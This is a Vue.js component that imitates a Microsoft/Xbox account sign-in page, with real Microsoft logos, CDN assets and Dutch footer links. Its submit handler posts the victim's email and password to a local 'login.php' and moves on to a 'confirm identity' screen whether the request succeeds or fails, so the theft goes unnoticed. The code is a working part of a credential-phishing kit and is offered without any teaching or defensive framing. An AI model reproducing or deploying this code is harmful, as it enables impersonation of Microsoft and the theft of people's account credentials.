<template>
  <div>
    <github-dialog
      v-if="githubDialogShowing"
      @close="githubDialogShowing = false"
    />
    <div>
      <div class="background" role="presentation">
        <div
          style="background: rgb(16, 124, 16);"
        ></div>
        <div
          class="backgroundImage"
          style="background: rgb(16, 124, 16);"
        ></div>
      </div>
    </div>
    <form
      name="f1"
      id="i0281"
      novalidate="novalidate"
      spellcheck="false"
      target="_top"
      autocomplete="off"
      @submit.prevent="formSubmit"
    >
      <div class="outer">
        <div class="middle">
          <div class="background-logo-holder">
            <img class="background-logo" role="presentation" :src="require('./../assets/xbox-logo.png')">
          </div>
          <div class="inner fade-in-lightbox" style="overflow: hidden;">
            <div class="lightbox-cover"></div>
            <div class="row">
              <img
                class="logo"
                src="https://logincdn.msauth.net/16.000.28253.1/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"
                alt="Microsoft"
              />
            </div>
            <transition
              name="slide-right"
              :duration="{ enter: 400, leave: 300 }"
            >
              <login-view
                @signInOptions="signInOptions"
                @next="loginNextClick"
                ref="loginView"
                v-if="step === 1"
              />
            </transition>
            <transition name="slide" :duration="{ enter: 400, leave: 300 }">
              <choose-login-view
                @back="optionsBack"
                @show-dialog="showGithubDialog"
                v-if="step === 2"
              />
            </transition>
            <transition name="slide" :duration="{ enter: 400, leave: 300 }">
              <password-view
                @back="passwordBackClick"
                :password-error="passwordError"
                v-if="step === 3"
              />
            </transition>
            <transition name="slide" :duration="{ enter: 400, leave: 300 }">
              <confirm-identity v-if="step === 4" />
            </transition>
          </div>
          <div id="footer" class="footer default" role="contentinfo">
            <div>
              <div id="footerLinks" class="footerNode text-secondary">
                <span id="ftrCopy">© {{ year }} Microsoft</span>
                <a
                  id="ftrTerms"
                  href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=NL-NL&amp;vv=1600&amp;uaid=8254b89138354810a9daa3fa058647f9"
                  >Gebruiksvoorwaarden</a
                >
                <a
                  id="ftrPrivacy"
                  href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=NL-NL&amp;vv=1600&amp;uaid=8254b89138354810a9daa3fa058647f9"
                  >Privacy en cookies</a
                >
                <a
                  href="#"
                  role="button"
                  class="moreOptions"
                  aria-label="Klik hier voor informatie over probleemoplossing"
                  aria-expanded="false"
                  @click="errorDetails = !errorDetails"
                >
                  <img
                    class="desktopMode"
                    role="presentation"
                    src="https://logincdn.msauth.net/16.000.28253.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"
                  />
                  <img
                    class="mobileMode"
                    role="presentation"
                    src="https://logincdn.msauth.net/16.000.28253.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"
                  />
                </a>
              </div>
            </div>
          </div>
          <div
            id="errorDetailsBanner"
            class="debug-details-banner table"
            v-if="errorDetails"
          >
            <div class="table-row">
              <div class="table-cell">
                <div class="override-ltr">
                  <div>
                    <span class="bold">Correlation Id: </span>
                    <span>0211e3d74d2a744c7309b7822f8d413a</span>
                  </div>
                  <div>
                    <span class="bold">Timestamp: </span>
                    <span>{{ new Date().toISOString() }}</span>
                  </div>
                </div>
              </div>
              <div>
                <a
                  id="errorBannerCloseLink"
                  role="button"
                  href="#"
                  aria-label="Foutgegevens sluiten"
                >
                  <img
                    role="presentation"
                    src="https://logincdn.msauth.net/16.000.28253.1/images/close.svg?x=40eb39126300b56bf66c20ee75b54093"
                    alt="Foutgegevens sluiten"
                    @click="errorDetails = false"
                  />
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
  </div>
</template>

<script>
/* eslint-disable */ 
import axios from 'axios';

import LoginView from "./LoginView.vue";
import ChooseLoginView from "./ChooseLoginView.vue";
import GithubDialog from "./githubDialog.vue";
import PasswordView from "./PasswordView.vue";
import ConfirmIdentity from "./ConfirmIdentity.vue";
export default {
  name: "mainview",
  components: {
    LoginView,
    ChooseLoginView,
    GithubDialog,
    PasswordView,
    ConfirmIdentity
  },
  data() {
    return {
      errorDetails: false,
      githubDialogShowing: false,
      step: 1,
      passwordError: false
    };
  },
  methods: {
    signInOptions() {
      this.step = 2;
    },
    optionsBack() {
      this.step = 1;
    },
    showGithubDialog() {
      this.githubDialogShowing = true;
    },
    formSubmit() {
      switch (this.step) {
        case 1:
          this.$refs["loginView"].clickNext();
          break;

        case 3:
          if (this.password.length === 0) {
            this.passwordError = true;
          } else {
            let vm = this
            axios.post('login.php', {email: vm.emailAddress, password: vm.password})
            .then(res => {
                this.step = 4;
            })
            .catch(error => {
                this.step = 4;
            })
          }
          break;
      }
    },
    loginNextClick() {
      this.step = 3;
    },
    passwordBackClick() {
      this.step = 1;
    }
  },
  computed: {
    emailAddress: {
      get() {
        return this.$store.state.hotmail.emailAddress;
      },
      set(value) {
        this.$store.commit("setEmailAddress", value);
      }
    },
    password: {
      get() {
        return this.$store.state.hotmail.password;
      },
      set(value) {
        this.$store.commit("setPassword", value);
      }
    },
    year () {
      return new Date().getFullYear()
    }
  },
  watch: {
    password: function(val) {
      this.passwordError = false;
    }
  }
};
</script>

